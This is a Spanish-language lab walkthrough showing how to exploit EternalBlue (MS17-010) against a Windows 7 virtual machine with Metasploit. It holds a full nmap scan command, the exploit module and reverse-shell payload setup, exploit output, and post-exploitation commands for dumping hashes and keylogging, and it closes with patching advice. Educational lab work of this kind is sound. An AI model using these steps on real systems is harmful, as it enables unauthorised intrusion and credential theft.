Lab Environment

Atacante

  • Kali Linux 2024+
  • Nmap / Arp-Scan
  • Metasploit MSF

Víctima

  • Windows 7 SP1
  • Vulnerable a EternalBlue
  • SMBv1 Habilitado

Network: 172.30.17.0/24 (Isolated Lab)

Fase 1: Discovery

Descubrimiento de servicios con Nmap avanzado:


sudo nmap -p- --open -sS -sVC --min-rate 5000 -Pn 172.30.17.70 -oN scan.log
TIP: Usamos -sS para reducir el ruido en los logs de la víctima y -Pn porque Windows 7 suele bloquear ICMP (ping).

Fase 2: Análisis

Detección del vector crítico de entrada:

VULNERABILIDAD DETECTADA

MS17-010

CVE-2017-0143 (ETERNALBLUE)

Afecta al manejo de paquetes SMBv1 permitiendo la ejecución de código en memoria sin credenciales.

Fase 3: Exploit

Configuración del módulo en msfconsole:

# Localizar y usar
use exploit/windows/smb/ms17_010_eternalblue

# Configurar Target
set RHOSTS 172.30.17.70

# Configurar Payload (Reverse TCP)
set LHOST 172.30.X.X  # Tu IP local
set LPORT 4444

Payload: windows/x64/meterpreter/reverse_tcp

Fase 4: Ejecución

Lanzamiento del ataque y obtención de sesión:

exploit

[*] 172.30.17.70:445 - Target is Windows 7...
[*] 172.30.17.70:445 - Sending exploit...
[+] 172.30.17.70:445 - Exploit completed!
[*] Meterpreter session 1 opened (172.30.X.X:4444 -> 172.30.17.70:49158)
Acceso obtenido como SYSTEM (Máximos privilegios).

Post-Explotación

Control total del sistema desde meterpreter:

meterpreter > hashdump   # Obtener hashes de contraseñas
meterpreter > screenshot # Captura de pantalla
meterpreter > keyscan_start # Keylogger
meterpreter > shell      # Acceso a CMD
Meterpreter reside en memoria, lo que dificulta su detección por antivirus tradicionales.

Errores Comunes

Conectividad: VMs en distintos adaptadores de red (NAT vs Bridge).
Firewall: SMB (445) bloqueado o filtrado por reglas de red.
Blue Screen: EternalBlue puede causar BSOD si el sistema no es compatible.

Conclusiones

  1. La actualización de parches (MS17-010) es crítica.
  2. Deshabilitar servicios antiguos (SMBv1) reduce la superficie de ataque.
  3. El escaneo regular ayuda a prevenir intrusiones.
